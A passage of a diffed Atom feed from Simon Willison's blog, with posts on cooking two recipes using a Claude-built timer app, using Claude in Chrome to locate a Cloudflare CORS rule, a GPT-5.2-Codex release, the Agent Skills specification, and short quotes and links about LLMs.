+&lt;p&gt;We have family staying at the moment, which means cooking for four. We subscribe to a meal delivery service called &lt;a href="https://www.greenchef.com/"&gt;Green Chef&lt;/a&gt;, mainly because it takes the thinking out of cooking three times a week: grab a bag from the fridge, follow the instructions, eat.&lt;/p&gt;
+&lt;p&gt;Each bag serves two portions, so cooking for four means preparing two bags at once.&lt;/p&gt;
+&lt;p&gt;I have done this a few times now and it is always a mad flurry of pans and ingredients and timers and desperately trying to figure out what should happen when and how to get both recipes finished at the same time. It's fun but it's also chaotic and error-prone.&lt;/p&gt;
+&lt;p&gt;This time I decided to try something different, and potentially even more chaotic and error-prone: I outsourced the planning entirely to Claude.&lt;/p&gt;
+&lt;p&gt;I took this single photo of the two recipe cards side-by-side and fed it to Claude Opus 4.5 (in the Claude iPhone app) with this prompt:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Extract both of these recipes in as much detail as possible&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/recipe-cards.jpg" alt="Two recipe cards placed next to each other on a kitchen counter. Each card has detailed instructions plus photographs of steps." style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This is a moderately challenging vision task in that there quite a lot of small text in the photo. I wasn't confident Opus could handle it.&lt;/p&gt;
+&lt;p&gt;I hadn't read the recipe cards myself. The responsible thing to do here would be a thorough review or at least a spot-check - I chose to keep things chaotic and didn't do any more than quickly eyeball the result.&lt;/p&gt;
+&lt;p&gt;I asked what pots I'd need:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Give me a full list of pots I would need if I was cooking both of them at once&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Then I prompted it to build a custom application to help me with the cooking process itself:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I am going to cook them both at the same time. Build me a no react, mobile, friendly, interactive, artifact that spells out the process with exact timing on when everything needs to happen have a start setting at the top, which starts a timer and persists when I hit start in localStorage in case the page reloads. The next steps should show prominently with countdowns to when they open. The full combined timeline should be shown slow with calculated times tor when each thing should happen&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I copied the result out onto my own hosting (&lt;a href="https://tools.simonwillison.net/blackened-cauliflower-and-turkish-style-stew"&gt;you can try it here&lt;/a&gt;) because I wasn't sure if localStorage would work inside the Claude app and I &lt;em&gt;really&lt;/em&gt; didn't want it to forget my times!&lt;/p&gt;
+&lt;p&gt;Then I clicked "start cooking"!&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/recipe-timer.gif" alt="The recipe app shows a full timeline with 00:00 Preheat Oven and onwards, plus a big Start Cooking button. In the animation clicking the button starts a timer clicking up, adds a Do this now panel showing the Start all prep work step, shows Coming Up Next with timers counting down to the next steps and updates the full timeline to show local clock times where it previously showed durations from 00:00 upwards." style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;p&gt;Here's the &lt;a href="https://claude.ai/share/4acab994-c22b-4ddf-81bd-2f22d947c521"&gt;full Claude transcript&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;There was just one notable catch: our dog, Cleo, knows &lt;em&gt;exactly&lt;/em&gt; when her dinner time is, at 6pm sharp. I forgot to mention this to Claude, which had scheduled several key steps colliding with Cleo's meal. I got woofed at. I deserved it.&lt;/p&gt;
+&lt;p&gt;To my great surprise, &lt;em&gt;it worked&lt;/em&gt;. I followed the recipe guide to the minute and served up both meals exactly 44 minutes after I started cooking.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/recipe-finished.jpg" alt="A small bowl (a beautiful blue sea textured bowl, made by Natalie Downe) contains a chickpea stew. A larger black bowl has couscous, green beans and blackened cauliflower." style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;p&gt;The best way to learn the capabilities of LLMs is to throw tasks at them that may be beyond their abilities and see what happens. In this case I fully expected that something would get forgotten or a detail would be hallucinated and I'd end up scrambling to fix things half way through the process. I was surprised and impressed that it worked so well.&lt;/p&gt;
+&lt;p&gt;Some credit for the app idea should go to my fellow hackers at &lt;a href="https://devfort.com/fort/2/"&gt;/dev/fort 2 in 2009&lt;/a&gt;, when we rented Knockbrex Castle in Dumfries, Scotland for a week and attempted to build a cooking timer application for complex meals.&lt;/p&gt;
+&lt;h4 id="generating-recipes-from-scratch"&gt;Generating recipes from scratch&lt;/h4&gt;
+&lt;p&gt;Most of my other cooking experiments with LLMs have been a whole lot simpler than this: I ask for a recipe, ask for some variations and then cook one of them and see what happens.&lt;/p&gt;
+&lt;p&gt;This works remarkably well considering LLMs have no taste buds.&lt;/p&gt;
+&lt;p&gt;I've started to think of this as asking LLMs for the &lt;em&gt;average&lt;/em&gt; recipe for a dish, based on all of the recipes they have hoovered up during their training. It turns out the mean version of every guacamole recipe on the internet is a decent guacamole!&lt;/p&gt;
+&lt;p&gt;Here's an example of a recipe I tried recently that worked out really well. I was helping Natalie run her ceramic stall at the farmers market and the stall next to us sold excellent dried beans. I've never used dried beans before, so I took a photo of their selection and asked Claude what I could do with them:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/beans-1.jpg" alt="Several bags of tasty looking beans of different varieties and colors" style="width: 48%;" /&gt; &lt;img src="https://static.simonwillison.net/static/2025/beans-2.jpg" alt="More bags of beans." style="width: 48%;" /&gt;&lt;/p&gt;
+&lt;p&gt;Identify these beans&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It took a guess at the beans, then I said:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Get me excited about cooking with these! If I bought two varietiew what could I make&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;"Get me excited" switches Claude into a sort of hype-man mode, which is kind of entertaining:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Oh, you're about to enter the &lt;em&gt;wonderful&lt;/em&gt; world of bean cooking! Let me get you pumped about some killer two-bean combos: [...]&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Mixed bean salad&lt;/strong&gt; with lemon, olive oil, fresh herbs, cherry tomatoes - light but satisfying [...]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I replied:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;OK Bean salad has me interested - these are dried beans. Give me some salad options I can make that would last a long time in the fridge&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;... and after some back and forth we arrived on the &lt;a href="https://claude.ai/share/c7534766-22d8-481b-bd80-a21abc53f5b2"&gt;recipe in this transcript&lt;/a&gt;, which I cooked the following day (asking plenty of follow-up questions) and thoroughly enjoyed.&lt;/p&gt;
+&lt;p&gt;I've done this a bunch of times with a bunch of different recipes across both Claude and ChatGPT and honestly I've not had a notable miss yet. Being able to say "make it vegan" or "I don't have coriander, what can I use instead?" or just "make it tastier" is a really fun way to explore cooking.&lt;/p&gt;
+&lt;p&gt;It's also fun to repeat "make it tastier" multiple times to see how absurd you can get.&lt;/p&gt;
+&lt;h4 id="i-really-want-someone-to-turn-this-into-a-benchmark-"&gt;I really want someone to turn this into a benchmark!&lt;/h4&gt;
+&lt;p&gt;Cooking with LLMs is a lot of fun. There's an opportunity here for a &lt;em&gt;really&lt;/em&gt; neat benchmark: take a bunch of leading models, prompt them for recipes, follow those recipes and taste-test the results!&lt;/p&gt;
+&lt;p&gt;The logistics of running this are definitely too much for me to handle myself. I have enough trouble cooking two meals at once, for a solid benchmark you'd ideally have several models serving meals up at the same time to a panel of tasters.&lt;/p&gt;
+&lt;p&gt;If someone else wants to try this please let me know how it goes!&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/cooking"&gt;cooking&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/devfort"&gt;devfort&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/tools"&gt;tools&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/anthropic"&gt;anthropic&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude"&gt;claude&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vision-llms"&gt;vision-llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="cooking"/><category term="devfort"/><category term="tools"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="anthropic"/><category term="claude"/><category term="vision-llms"/><category term="vibe-coding"/></entry><entry><title>Using Claude in Chrome to navigate out the Cloudflare dashboard</title><link href="https://simonwillison.net/2025/Dec/22/claude-chrome-cloudflare/#atom-everything" rel="alternate"/><published>2025-12-22T16:10:30+00:00</published><updated>2025-12-22T16:10:30+00:00</updated><id>https://simonwillison.net/2025/Dec/22/claude-chrome-cloudflare/#atom-everything</id><summary type="html">
+    &lt;p&gt;I just had my first success using a browser agent - in this case the &lt;a href="https://support.claude.com/en/articles/12012173-getting-started-with-claude-in-chrome"&gt;Claude in Chrome extension&lt;/a&gt; - to solve an actual problem.&lt;/p&gt;
+&lt;p&gt;A while ago I set things up so anything served from the &lt;code&gt;https://static.simonwillison.net/static/cors-allow/&lt;/code&gt; directory of my S3 bucket would have open &lt;code&gt;Access-Control-Allow-Origin: *&lt;/code&gt; headers. This is useful for hosting files online that can be loaded into web applications hosted on other domains.&lt;/p&gt;
+&lt;p&gt;Problem is I couldn't remember how I did it! I initially thought it was an S3 setting, but it turns out S3 lets you set CORS at the bucket-level but not for individual prefixes.&lt;/p&gt;
+&lt;p&gt;I then suspected Cloudflare, but I find the Cloudflare dashboard really difficult to navigate.&lt;/p&gt;
+&lt;p&gt;So I decided to give Claude in Chrome a go. I installed and enabled the extension (you then have to click the little puzzle icon and click "pin" next to Claude for the icon to appear, I had to ask Claude itself for help figuring that out), signed into Cloudflare, opened the Claude panel and prompted:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;I'm trying to figure out how come all pages under http://static.simonwillison.net/static/cors/ have an open CORS policy, I think I set that up through Cloudflare but I can't figure out where&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Off it went. It took 1m45s to find exactly what I needed.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Screenshot of Chrome - on the left is the Cloudflare dashboard. On the right a Claude chat panel which shows the final result: Summary  Found it! Your open CORS policy for the /static/cors/ directory on static.simonwillison.net is configured through Cloudflare Transform Rules, specifically a Response Header Transform Rule named static.simonwillis.net/static/cors-allow/*.  Here's exactly what's set up:  Rule Configuration:      Type: HTTP Response Header Transform Rule     Applies to: Any URL matching https://static.simonwillison.net/static/cors-allow/* (wildcard match)     Action: Modifies the response header access-control-allow-origin and sets it to *  This is why all pages under that path have an open CORS policy — the * value for Access-Control-Allow-Origin means any origin can access those resources.  Where to find/modify it in the dashboard:      Go to your domain settings (simonwillison.net)     Navigate to Rules &amp;gt; Rules Overview (in the left sidebar)     Scroll down to Response Header Transform Rules (should show 2 active)     Click on the rule named static.simonwillis.net/static/cors-allow/* to view or edit it  " src="https://static.simonwillison.net/static/2025/claude-chrome-cloudflare.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;Claude's conclusion:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Found it! Your open CORS policy for the &lt;code&gt;/static/cors/&lt;/code&gt; directory on &lt;code&gt;static.simonwillison.net&lt;/code&gt; is configured through &lt;strong&gt;Cloudflare Transform Rules&lt;/strong&gt;, specifically a &lt;strong&gt;Response Header Transform Rule&lt;/strong&gt; named &lt;code&gt;static.simonwillis.net/static/cors-allow/*&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;There's no "share transcript" option but I used copy and paste and two gnarly Claude Code sessions (&lt;a href="https://gistpreview.github.io/?56adf4212345d9967c22aab1362b847b"&gt;one&lt;/a&gt;, &lt;a href="https://gistpreview.github.io/?1d5f524616bef403cdde4bc92da5b0ba"&gt;two&lt;/a&gt;) to turn it into an HTML transcript which &lt;a href="https://static.simonwillison.net/static/2025/claude-chrome-transcript.html"&gt;you can take a look at here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I remain deeply skeptical of the entire browsing agent category due to my concerns about prompt injection risks—I watched what it was doing here like a &lt;em&gt;hawk&lt;/em&gt;—but I have to admit this was a very positive experience.&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/anthropic"&gt;anthropic&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude"&gt;claude&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/browser-agents"&gt;browser-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/cors"&gt;cors&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/chrome"&gt;chrome&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/cloudflare"&gt;cloudflare&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/prompt-injection"&gt;prompt-injection&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-agents"&gt;ai-agents&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="anthropic"/><category term="claude"/><category term="browser-agents"/><category term="cors"/><category term="ai"/><category term="llms"/><category term="generative-ai"/><category term="chrome"/><category term="cloudflare"/><category term="prompt-injection"/><category term="ai-agents"/></entry><entry><title>Quoting Shriram Krishnamurthi</title><link href="https://simonwillison.net/2025/Dec/21/shriram-krishnamurthi/#atom-everything" rel="alternate"/><published>2025-12-21T05:26:09+00:00</published><updated>2025-12-21T05:26:09+00:00</updated><id>https://simonwillison.net/2025/Dec/21/shriram-krishnamurthi/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://parentheticallyspeaking.org/articles/pedagogy-recommendations/"&gt;&lt;p&gt;Every time you are inclined to use the word “teach”, replace it with “learn”. That is, instead of saying, “I teach”, say “They learn”. It’s very easy to determine what you teach; you can just fill slides with text and claim to have taught. Shift your focus to determining how you know whether they learned what you claim to have taught (or indeed anything at all!). That is &lt;em&gt;much&lt;/em&gt; harder, but that is also the real objective of any educator.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://parentheticallyspeaking.org/articles/pedagogy-recommendations/"&gt;Shriram Krishnamurthi&lt;/a&gt;, Pedagogy Recommendations&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/teaching"&gt;teaching&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="teaching"/></entry><entry><title>Quoting Andrej Karpathy</title><link href="https://simonwillison.net/2025/Dec/19/andrej-karpathy/#atom-everything" rel="alternate"/><published>2025-12-19T23:07:52+00:00</published><updated>2025-12-19T23:07:52+00:00</updated><id>https://simonwillison.net/2025/Dec/19/andrej-karpathy/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://karpathy.bearblog.dev/year-in-review-2025/"&gt;&lt;p&gt;In 2025, Reinforcement Learning from Verifiable Rewards (RLVR) emerged as the de facto new major stage to add to this mix. By training LLMs against automatically verifiable rewards across a number of environments (e.g. think math/code puzzles), the LLMs spontaneously develop strategies that look like "reasoning" to humans - they learn to break down problem solving into intermediate calculations and they learn a number of problem solving strategies for going back and forth to figure things out (see DeepSeek R1 paper for examples).&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://karpathy.bearblog.dev/year-in-review-2025/"&gt;Andrej Karpathy&lt;/a&gt;, 2025 LLM Year in Review&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/andrej-karpathy"&gt;andrej-karpathy&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm"&gt;llm&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-reasoning"&gt;llm-reasoning&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/definitions"&gt;definitions&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/deepseek"&gt;deepseek&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="andrej-karpathy"/><category term="llm"/><category term="generative-ai"/><category term="llm-reasoning"/><category term="definitions"/><category term="ai"/><category term="llms"/><category term="deepseek"/></entry><entry><title>Sam Rose explains how LLMs work with a visual essay</title><link href="https://simonwillison.net/2025/Dec/19/sam-rose-llms/#atom-everything" rel="alternate"/><published>2025-12-19T18:33:41+00:00</published><updated>2025-12-19T18:33:41+00:00</updated><id>https://simonwillison.net/2025/Dec/19/sam-rose-llms/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://ngrok.com/blog/prompt-caching/"&gt;Sam Rose explains how LLMs work with a visual essay&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Sam Rose is one of my favorite authors of &lt;a href="https://simonwillison.net/tags/explorables/"&gt;explorable interactive explanations&lt;/a&gt; - here's &lt;a href="https://samwho.dev/"&gt;his previous collection&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Sam joined ngrok in September as a developer educator. Here's his first big visual explainer for them, ostensibly about how prompt caching works but it quickly expands to cover tokenization, embeddings, and the basics of the transformer architecture.&lt;/p&gt;
+&lt;p&gt;The result is one of the clearest and most accessible introductions to LLM internals I've seen anywhere.&lt;/p&gt;
+&lt;div style="text-align: center"&gt;&lt;img alt="Animation. Starts in tokens mode with an array of 75, 305, 24, 887 - clicking embeddings animates those into a 2D array showing each one to be composed of three floating point numbers." src="https://static.simonwillison.net/static/2025/tokens-embeddings.gif" style="max-width: 100%"&gt;&lt;/div&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/explorables"&gt;explorables&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sam-rose"&gt;sam-rose&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/tokenization"&gt;tokenization&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai"/><category term="explorables"/><category term="generative-ai"/><category term="llms"/><category term="sam-rose"/><category term="tokenization"/></entry><entry><title>Introducing GPT-5.2-Codex</title><link href="https://simonwillison.net/2025/Dec/19/introducing-gpt-52-codex/#atom-everything" rel="alternate"/><published>2025-12-19T05:21:17+00:00</published><updated>2025-12-19T05:21:17+00:00</updated><id>https://simonwillison.net/2025/Dec/19/introducing-gpt-52-codex/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://openai.com/index/introducing-gpt-5-2-codex/"&gt;Introducing GPT-5.2-Codex&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+The latest in OpenAI's &lt;a href="https://simonwillison.net/tags/gpt-codex/"&gt;Codex family of models&lt;/a&gt; (not the same thing as their Codex CLI or Codex Cloud coding agent tools).&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;GPT‑5.2-Codex is a version of &lt;a href="https://openai.com/index/introducing-gpt-5-2/"&gt;GPT‑5.2⁠&lt;/a&gt; further optimized for agentic coding in Codex, including improvements on long-horizon work through context compaction, stronger performance on large code changes like refactors and migrations, improved performance in Windows environments, and significantly stronger cybersecurity capabilities.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;As with some previous Codex models this one is available via their Codex coding agents now and will be coming to the API "in the coming weeks". Unlike previous models there's a new invite-only preview process for vetted cybersecurity professionals for "more permissive models".&lt;/p&gt;
+&lt;p&gt;I've been very impressed recently with GPT 5.2's ability to &lt;a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/"&gt;tackle multi-hour agentic coding challenges&lt;/a&gt;. 5.2 Codex scores 64% on the Terminal-Bench 2.0 benchmark that GPT-5.2 scored 62.2% on. I'm not sure how concrete that 1.8% improvement will be!&lt;/p&gt;
+&lt;p&gt;I didn't hack API access together this time (see &lt;a href="https://simonwillison.net/2025/Nov/9/gpt-5-codex-mini/"&gt;previous attempts&lt;/a&gt;), instead opting to just ask Codex CLI to "Generate an SVG of a pelican riding a bicycle" while running the new model (effort medium). &lt;a href="https://tools.simonwillison.net/codex-timeline?url=https://gist.githubusercontent.com/simonw/10ad81e82889a97a7d28827e0ea6d768/raw/d749473b37d86d519b4c3fa0892b5e54b5941b38/rollout-2025-12-18T16-09-10-019b33f0-6111-7840-89b0-aedf755a6e10.jsonl#tz=local&amp;amp;q=&amp;amp;type=all&amp;amp;payload=all&amp;amp;role=all&amp;amp;hide=1&amp;amp;truncate=1&amp;amp;sel=3"&gt;Here's the transcript&lt;/a&gt; in my new Codex CLI timeline viewer, and here's the pelican it drew:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text by GPT-5.2-Codex: A minimalist illustration of a white pelican with a large orange beak riding a teal bicycle across a sandy strip of ground. The pelican leans forward as if pedaling, its wings tucked back and legs reaching toward the pedals. Simple gray motion lines trail behind it, and a pale yellow sun sits in the top‑right against a warm beige sky." src="https://static.simonwillison.net/static/2025/5.2-codex-pelican.png" /&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pelican-riding-a-bicycle"&gt;pelican-riding-a-bicycle&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-release"&gt;llm-release&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/gpt-codex"&gt;gpt-codex&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai"/><category term="openai"/><category term="generative-ai"/><category term="llms"/><category term="pelican-riding-a-bicycle"/><category term="llm-release"/><category term="codex-cli"/><category term="gpt-codex"/></entry><entry><title>Agent Skills</title><link href="https://simonwillison.net/2025/Dec/19/agent-skills/#atom-everything" rel="alternate"/><published>2025-12-19T01:09:18+00:00</published><updated>2025-12-19T01:09:18+00:00</updated><id>https://simonwillison.net/2025/Dec/19/agent-skills/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://agentskills.io/"&gt;Agent Skills&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Anthropic have turned their &lt;a href="https://simonwillison.net/tags/skills/"&gt;skills mechanism&lt;/a&gt; into an "open standard", which I guess means it lives in an independent &lt;a href="https://github.com/agentskills/agentskills"&gt;agentskills/agentskills&lt;/a&gt; GitHub repository now? I wouldn't be surprised to see this end up &lt;a href="https://simonwillison.net/2025/Dec/9/agentic-ai-foundation/"&gt;in the AAIF&lt;/a&gt;, recently the new home of the MCP specification.&lt;/p&gt;
+&lt;p&gt;The specification itself lives at &lt;a href="https://agentskills.io/specification"&gt;agentskills.io/specification&lt;/a&gt;, published from &lt;a href="https://github.com/agentskills/agentskills/blob/main/docs/specification.mdx"&gt;docs/specification.mdx&lt;/a&gt; in the repo.&lt;/p&gt;
+&lt;p&gt;It is a deliciously tiny specification - you can read the entire thing in just a few minutes. It's also quite heavily under-specified - for example, there's a &lt;code&gt;metadata&lt;/code&gt; field described like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Clients can use this to store additional properties not defined by the Agent Skills spec&lt;/p&gt;
+&lt;p&gt;We recommend making your key names reasonably unique to avoid accidental conflicts&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And an &lt;code&gt;allowed-skills&lt;/code&gt; field:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Experimental. Support for this field may vary between agent implementations&lt;/p&gt;
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;allowed-tools: Bash(git:*) Bash(jq:*) Read
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The Agent Skills homepage promotes adoption by OpenCode, Cursor,Amp, Letta, goose, GitHub, and VS Code. Notably absent is OpenAI, who are &lt;a href="https://simonwillison.net/2025/Dec/12/openai-skills/"&gt;quietly tinkering with skills&lt;/a&gt; but don't appear to have formally announced their support just yet.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Update 20th December 2025&lt;/strong&gt;: OpenAI &lt;a href="https://developers.openai.com/codex/skills/"&gt;have added Skills to the Codex documentation&lt;/a&gt; and the Codex logo is now &lt;a href="https://agentskills.io/"&gt;featured on the Agent Skills homepage&lt;/a&gt; (as of &lt;a href="https://github.com/agentskills/agentskills/commit/75287b28fb7a8106d7798de99e13189f7bea5ca0"&gt;this commit&lt;/a&gt;.)
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/anthropic"&gt;anthropic&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-agents"&gt;ai-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/skills"&gt;skills&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="anthropic"/><category term="ai-agents"/><category term="coding-agents"/><category term="skills"/></entry><entry><title>swift-justhtml</title><link href="https://simonwillison.net/2025/Dec/18/swift-justhtml/#atom-everything" rel="alternate"/><published>2025-12-18T23:57:58+00:00</published><updated>2025-12-18T23:57:58+00:00</updated><id>https://simonwillison.net/2025/Dec/18/swift-justhtml/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/kylehowells/swift-justhtml"&gt;swift-justhtml&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+First there was Emil Stenström's &lt;a href="https://simonwillison.net/2025/Dec/14/justhtml/"&gt;JustHTML in Python&lt;/a&gt;, then my &lt;a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/"&gt;justjshtml in JavaScript&lt;/a&gt;, then Anil Madhavapeddy's &lt;a href="https://simonwillison.net/2025/Dec/17/vibespiling/"&gt;html5rw in OCaml&lt;/a&gt;, and now Kyle Howells has built a vibespiled dependency-free HTML5 parser for Swift using the same coding agent tricks against the &lt;a href="https://github.com/html5lib/html5lib-tests"&gt;html5lib-tests&lt;/a&gt; test suite.&lt;/p&gt;
+&lt;p&gt;Kyle ran &lt;a href="https://github.com/kylehowells/swift-justhtml/blob/master/Benchmarks/BENCHMARK_RESULTS.md#performance-comparison"&gt;some benchmarks&lt;/a&gt; to compare the different implementations:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Rust (html5ever)&lt;/strong&gt; total parse time: 303 ms&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Swift&lt;/strong&gt; total parse time: 1313 ms&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;JavaScript&lt;/strong&gt; total parse time: 1035 ms&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt; total parse time: 4189 ms&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/html5"&gt;html5&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/swift"&gt;swift&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="html5"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="vibe-coding"/><category term="swift"/></entry><entry><title>Your job is to deliver code you have proven to work</title><link href="https://simonwillison.net/2025/Dec/18/code-proven-to-work/#atom-everything" rel="alternate"/><published>2025-12-18T14:49:38+00:00</published><updated>2025-12-18T14:49:38+00:00</updated><id>https://simonwillison.net/2025/Dec/18/code-proven-to-work/#atom-everything</id><summary type="html">
